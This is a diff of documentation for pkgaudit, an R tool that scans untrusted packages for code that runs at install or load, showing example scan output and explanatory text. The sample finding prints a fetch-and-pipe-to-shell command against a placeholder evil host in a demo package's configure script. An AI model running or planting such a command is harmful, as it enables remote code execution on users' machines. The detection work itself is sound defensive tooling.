@@ -54,7 +54,7 @@ print(result, path = FALSE)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-28 02:38 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-28 16:38 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
@@ -63,8 +63,8 @@ print(result, path = FALSE)
 ```
 
 [`summary()`](https://rdrr.io/r/base/summary.html) reports the number of
-findings by rule by phase. It also provides MITRE ATT&CK techniques
-associated with each rule.
+findings by rule and by phase. It also provides the MITRE ATT&CK
+techniques associated with each rule.
 
 ``` r
 
@@ -72,7 +72,7 @@ summary(result, path = FALSE)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-28 02:38 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-28 16:38 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> --- R Patterns --------------------------------------------------------------
 #> phase            rule            n   attck
@@ -110,32 +110,28 @@ summary(result, path = FALSE)
 Phases overlap – building a package with vignettes, for example, also
 installs and loads it – and one occurrence is counted under every phase
 it runs in. The summary above reflects five findings, some counted under
-multiple phases. To see only what is known to run automatically at
-installation from source, for example, pass an argument to `phase`:
+multiple phases. To see only what is known to run automatically on
+[`library()`](https://rdrr.io/r/base/library.html), for example, pass an
+argument to `phase`:
 
 ``` r
 
-summary(result, phase = c("at_install_src"), path = FALSE)
+summary(result, phase = c("at_load", "at_attach"), path = FALSE)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-28 02:38 UTC with pkgaudit v0.4.0, rules v0.4.0
-#> Phases:    at_install_src
+#> Scanned:   2026-08-28 16:38 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Phases:    at_load, at_attach
 #> 
 #> --- R Patterns --------------------------------------------------------------
-#> phase            rule     n   attck
-#> at_install_src   httr     1   T1041
-#> at_install_src   system   1   T1059.003 T1059.004
+#> phase     rule     n   attck
+#> at_load   system   1   T1059.003 T1059.004
 #> 
 #> --- Shell / Make Matches ----------------------------------------------------
-#> phase            rule     n   attck
-#> at_install_src   curl     1   T1041 T1105
+#> No matches were found.
 #> 
 #> --- Coverage ----------------------------------------------------------------
-#> status    top_level   type    files   lines
-#> parsed    R/          R           2       6
-#> parsed    man/        Rd          1      12
-#> matched   .           shell       1       3
+#> No files were found.
 #> 
 #> --- Errors ------------------------------------------------------------------
 #> No exceptions were raised.
@@ -149,8 +145,9 @@ layout.
 
 ## Examining results
 
-A `pkgaudit` object is a named list of ordinary data frames, plus scan
-metadata, so findings can be filtered, joined and reported on directly.
+A `pkgaudit` object is a named list of ordinary data frames, plus a
+named list of scan metadata, so findings can be filtered, joined, and
+reported on directly.
 
 ``` r
 
@@ -190,22 +187,22 @@ result$patterns[, c("rule", "file_context", "line_number", "column_number")]
 Additionally, `code_context` indicates where code sits within a file.
 File and code context are used to determine the phases. `guarded` is
 `TRUE` when a call may be stopped from running in the expected phase,
-e.g., a `\dontrun{}` block or a vignette marked `eval=FALSE`. `indirect`
-is `TRUE` when a call is made through a function name, e.g.,
-`do.call("system", ...)` instead of
+e.g., code in `\dontrun{}` in an `\examples{}` block or a code chunk
+marked `eval=FALSE` in a vignette. `indirect` is `TRUE` when a call is
+made through a function name, e.g., `do.call("system", ...)` instead of
 [`system()`](https://rdrr.io/r/base/system.html).
 
 ``` r
 
-result$patterns[, c("rule", "code_context", "guarded", "indirect")]
-#>            rule     code_context guarded indirect
-#> 1 download_file      in_function   FALSE    FALSE
-#> 2        system      onLoad_base   FALSE    FALSE
-#> 3 download_file      Rd_examples   FALSE    FALSE
-#> 4          httr Rd_Sexpr_install   FALSE    FALSE
+result$patterns[, c("code_context", "guarded", "indirect")]
+#>       code_context guarded indirect
+#> 1      in_function   FALSE    FALSE
+#> 2      onLoad_base   FALSE    FALSE
+#> 3      Rd_examples   FALSE    FALSE
+#> 4 Rd_Sexpr_install   FALSE    FALSE
 ```
 
-`preview` provides a snippet of the code and its surroundings that may
+`preview` provides a snippet of the code and its surroundings, which may
 allow reviewers to determine the relevance of a finding without opening
 the file.
 
@@ -226,19 +223,25 @@ Make-like files. Its columns mirror `$patterns`, but it does not have
 
 ``` r
 
-result$matches[, c("rule", "file_context", "line_number", "preview")]
-#>   rule file_context line_number                                   preview
-#> 1 curl    configure           3 curl -s https://www.evil.com/evil.sh | sh
+result$matches[, c("rule", "file_context", "line_number", "column_number")]
+#>   rule file_context line_number column_number
+#> 1 curl    configure           3             1
+```
+
+``` r
+
+result$matches[, c("preview")]
+#> [1] "curl -s https://www.evil.com/evil.sh | sh"
 ```
 
 ### Coverage
 
 `$coverage` reports what pkgaudit made of each file it scanned: `parsed`
-for R, matched against its parse tree; `matched` for shell and Make-like
-files, matched as text; `exportable` for languages pkgaudit does not
-read, such as C and Python; `unexamined` for files it did not read, such
-as serialized `.rda` and `.rds` objects; and `error` where it tried to
-read a file and could not.
+for R, which is matched against its XML parse tree; `matched` for shell
+and Make-like files, which are matched as text; `exportable` for
+languages pkgaudit does not read, such as C and Python; `unexamined` for
+files pkgaudit did not read, such as serialized `.rda` and `.rds`
+objects; and `error` for files pkgaudit tried to read and could not.
 
 ``` r
 
@@ -259,7 +262,7 @@ errors when scanning `untrustedpkg`.
 
 ### Metadata
 
-`$metadata` is a list of metadata.
+`$metadata` is a named list of metadata.
 
 ``` r
 
@@ -271,7 +274,7 @@ result$metadata
 #> [1] "0.1.0"
 #> 
 #> $pkg_path
-#> [1] "/tmp/Rtmp6PeZ0f/untrustedpkg-example/untrustedpkg"
+#> [1] "/tmp/RtmpAxF1hc/untrustedpkg-example/untrustedpkg"
 #> 
 #> $pkg_is_tarball
 #> [1] FALSE
@@ -289,7 +292,7 @@ result$metadata
 #> [1] "5fc1ec8e93232517679fb03df0f08020d844912e701615de7827666be2f6a7cd"
 #> 
 #> $scanned
-#> [1] "2026-08-28T02:38:54Z"
+#> [1] "2026-08-28T16:38:46Z"
 ```
 
 ### Subsetting by phase
@@ -313,8 +316,10 @@ result$patterns[result$patterns$at_load,
 ## Reviewing findings
 
 pkgaudit is a guide to human review, not a substitute for human
-judgment. Below we consider the four patterns and one match for
-`untrustedpkg`.
+judgment. Below we discuss how reviewers should evaluate the four
+patterns and one match for `untrustedpkg` and inspect the relevant
+files. In this case, it appears that `untrustedpkg` should *not* be
+used.
 
 ### Patterns
 
@@ -364,10 +369,10 @@ judgment. Below we consider the four patterns and one match for
 
 4.  A regular function in `R/fetch.R` calls
     [`download.file()`](https://rdrr.io/r/utils/download.file.html), but
-    a regular function is not known to run automatically, so this
-    pattern is reported under `none`. A reviewer may still want to
-    inspect if and when the function is called, and what would be
-    downloaded.
+    code inside a regular function in `R/` is not known to run
+    automatically, so this pattern is reported under `none`. A reviewer
+    may still want to inspect if and when the function is called, and
+    what would be downloaded.
 
 &nbsp;
 
@@ -390,9 +395,11 @@ judgment. Below we consider the four patterns and one match for
 
 ## Exporting findings
 
+pkgaudit can integrate its scan with other tools.
 [`emit_sarif()`](https://tylerjssmith.github.io/pkgaudit/reference/emit_sarif.md)
-renders a result as SARIF 2.1.0, the format code-scanning tools publish
-results in. It returns the document as a string and writes nothing.
+renders its results as SARIF 2.1.0, which editors and code-scanning
+platforms read directly. It returns the document as a string, which
+users may write to disk.
 
 ``` r
 
@@ -410,28 +417,32 @@ substr(sarif, 1, 200)
 #> 
 ```
 
-Written to a file and opened in an editor with a SARIF viewer, each
-finding appears on the line it was found. `level` is `note` for every
-result. When code executes is carried in `properties.phases`.
+Written to a file and opened in an editor with a SARIF viewer, such as
+VS Code with the [SARIF Viewer
+extension](https://marketplace.visualstudio.com/items?itemName=MS-SarifVSCode.sarif-viewer),
+each finding appears on the line it was found. `level` is `note` for
+every result. When code executes is carried in `properties.phases`.
 
 [`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
-writes the code pkgaudit cannot read into a directory so that a tool
-such as Semgrep can scan it. A whole file is copied verbatim; a vignette
-chunk is written into a file of its own, blank-padded so that its code
-sits at the same line numbers it occupies in the source. A finding
-another tool reports at line 40 of `intro.python.py` is therefore at
-line 40 of `intro.Rmd`. `untrustedpkg` contains only R and Bash, so
+exports code written in languages pkgaudit cannot read, like C and
+Python, to a directory for a scanner like Semgrep that can. A whole file
+is copied verbatim; a vignette chunk is written into a file of its own,
+blank-padded so that its code sits at the same line numbers it occupies
+in the source. A finding another tool reports at line 40 of
+`intro.python.py` would therefore be at line 40 of `intro.Rmd`.
+`untrustedpkg` contains only R and Bash, so here
 [`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
 would create an empty directory.
 
 ## Auditing a tarball
 
-A common workflow will be to scan a package that has not been installed.
 [`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
-takes a `.tar.gz` source package, validates it, extracts it to a
-temporary directory, scans it, and removes the directory. An untrusted
-archive is itself an attack surface, so validation fails closed: the
-whole archive is refused rather than partially extracted.
+takes a `.tar.gz` source package, validates it using
+[`validate_tar()`](https://tylerjssmith.github.io/pkgaudit/reference/validate_tar.md),
+extracts it to a temporary directory, scans it, and removes the
+directory. An untrusted archive is itself an attack surface, so
+validation fails closed: the whole archive is refused rather than
+partially extracted.
 
 ``` r
 
@@ -439,7 +450,7 @@ print(audit_tarball(tarball), path = FALSE)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source tarball)
 #> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
-#> Scanned:   2026-08-28 02:38 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-28 16:38 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
